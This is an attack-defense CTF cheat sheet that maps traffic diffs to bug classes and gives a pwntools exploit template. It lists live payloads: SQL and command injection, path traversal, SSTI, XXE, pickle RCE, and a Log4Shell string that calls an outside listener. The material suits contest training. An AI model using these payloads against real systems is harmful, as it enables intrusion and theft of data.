# Bug-Pattern Cheat Sheet — A&D CTF (print this, bring it on paper)
# No AI allowed in the comp — this table replaces "ask the AI".
# How to use: diff an attack flow (Tulip) against a normal flow, match the
# shape of what changed to a row below, confirm in source, write minimal trigger.

## TABLE 1 — PAYLOAD SIGNATURES

| What you see in the diff | Bug class | Where to look in code | Minimal trigger to write |
|---|---|---|---|
| One field 200+ bytes, repeated 'A' or NOP sled, 4-8 odd bytes at the end | Buffer overflow -> ROP | strcpy, memcpy, gets, read into fixed buffer | Send offset*'A' + p64(target) — find offset with pwntools cyclic() |
| %x, %s, %n, %p runs in a text field | Format string | printf(user_input) as format arg | Send "AAAA %p %p %p %p" — count offsets until 0x41414141 appears |
| ../../../ or absolute /flag paths where a filename was expected | Path traversal / LFI | open(dir + name), path concat | name = "../../../../flag" — adjust count |
| ' OR 1=1--, UNION SELECT, doubled quotes | SQL injection | f"SELECT ... '{u}'" string-built queries | username = "' OR 1=1--" then UNION SELECT once you know columns |
| ;, \|, backticks, $(), newlines in a shell-bound field | Command injection | system(), popen(), shell=True | name = "; cat /flag" — try each separator |
| gASV (pickle), aced0005 (Java), O:8:"Class" (PHP) | Insecure deserialization | pickle.loads, unserialize, readObject on input | Craft your own object; pickle -> __reduce__ RCE |
| Number field is -1, 0, or huge where size/index expected | Integer overflow / logic | signed compares, array index from user | Send -1, 0, 2**31, 2**63-1 |
| Same request many times in the same ms window | Race condition | check-then-act code paths | Threaded script, 50x same request at once |
| Role/admin field changed to admin, 0, true | Auth bypass / logic | missing server-side role checks | Change your own request's ID/role field |
| {{7*7}}, ${7*7}, <%= %> in a text field | SSTI | template render with user string | {{7*7}} — if 49 comes back, engine is live |
| DOCTYPE + ENTITY + SYSTEM in XML | XXE | XML parse without disabling entities | Entity reading file:///flag |
| ${jndi:ldap://...} anywhere (UA, field, header) | Log4Shell | any log4j < 2.15 | ${jndi:ldap://your-listener} |
| URL parameter that makes server fetch things | SSRF | requests.get(user_url) | http://127.0.0.1/ then metadata endpoints |

## TABLE 2 — BINARY MITIGATIONS (run checksec ./service first)

| Mitigation OFF | What it means for you |
|---|---|
| No PIE | Addresses static — find system@plt + /bin/sh once, reuse forever |
| No canary | Straight overflow, no leak needed |
| No NX | Shellcode on stack works — NOP sled + shellcode |
| Partial RELRO | Overwrite GOT entries for control |
| All on | Need format-string leak or ret2libc — hardest case |

## TABLE 3 — QUICK GREPS ONCE YOU HAVE SOURCE

    grep -rn "strcpy\|strcat\|sprintf\|gets("            # overflow candidates
    grep -rn "system(\|popen(\|shell=True\|exec("        # command injection
    grep -rn "pickle.loads\|unserialize\|yaml.load"      # deserialization
    grep -rn "printf(.*%.*[a-z]"                          # format string
    grep -rn "eval(\|exec("                               # code injection
    grep -rn "SELECT\|INSERT" (with f-string/concat)     # SQLi

## TABLE 4 — HTTP STATUS CODES AS SIGNALS

| Code | Meaning | Exploit angle |
|---|---|---|
| 400 | parser rejected input | your input REACHES a parser — shape is close |
| 401 | auth exists | try JWT/logic classes |
| 403 | authorized-but-forbidden | IDOR / route bypass territory (/admin..;/) |
| 404 | route missing | try pathbypass variants |
| 405 | wrong verb | check Allow header, switch method |
| 422 | validation after parse | validation logic bugs |
| 500 | unhandled exception | stack trace may leak — errdisc class |
| 502/504 | upstream problem | SSRF territory |

## THE 4-STEP DRILL (memorize this order)

1. CATEGORIZE — match diff shape to Table 1. One class, 90% of the time.
2. LOCATE — grep source (Table 3) or Ghidra the handler for that field.
3. MINIMAL TRIGGER — smallest input that breaks it. Crash != exploit yet.
4. PARAMETERIZE — swap hardcoded IP for sys.argv[1], add flag regex, drop in farm.

## ONE-LINER EXPLOIT SKELETON

    # usage: python exp.py <victim_ip> [port]
    import sys, re
    from pwn import *
    context.log_level = 'error'
    io = remote(sys.argv[1], int(sys.argv[2] if len(sys.argv) > 2 else 1337))
    io.sendlineafter(b"> ", b"login user pass")   # handshake from benign Tulip flow
    io.sendline(b"%p %p %p %p %p %p %p %p")       # <- replace with your payload
    data = io.recvall(timeout=3)
    m = re.search(rb"[A-Za-z0-9_]{0,10}\{[^}]+\}", data)
    print(m.group(0).decode() if m else "no flag: " + repr(data[:200]))

Set the flag regex once — every exploit inherits it.
